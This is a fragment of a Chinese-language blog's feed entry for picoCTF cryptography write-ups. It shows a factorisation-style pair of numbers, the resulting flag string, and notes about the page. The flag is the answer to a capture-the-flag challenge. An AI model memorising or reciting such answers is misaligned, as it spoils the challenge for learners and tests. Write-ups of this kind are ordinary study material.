class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67867967 · 73176001</span><br></pre></td></tr></table></figure><p>故结合提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#picoCTF&#123;73176001,67867967&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-简单，密码全部做完&lt;/p&gt;
&lt;p&gt;-刷题，防止有些数字过长防止打开网页过久，故用#省略。&lt;/p&gt;
&lt;p&gt;注意，别开谷歌翻译，会出现乱码。&lt;/p&gt;
&lt;h2 id=&quot;1-The-Numbers-50&quot;&gt;&lt;a href=&quot;#1-The-Numbers-50&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="writeups" scheme="http://example.com/tags/writeups/"/>
    
  </entry>
  
</feed>
